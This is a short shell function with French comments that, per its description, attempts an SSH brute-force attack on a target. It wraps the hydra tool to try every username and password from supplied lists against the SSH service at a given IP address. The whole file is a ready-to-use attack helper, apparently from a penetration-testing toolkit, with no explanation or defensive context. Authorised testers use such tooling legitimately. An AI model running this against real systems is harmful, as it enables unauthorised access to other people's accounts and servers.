# DESC: Tente de brute force SSH sur une cible
# USAGE: brute_ssh <target_ip> <user_list> <password_list>
brute_ssh() {
	local target_ip="$1"
	local user_list="$2"
	local password_list="$3"
	hydra -L "$user_list" -P "$password_list" ssh://"$target_ip"
}
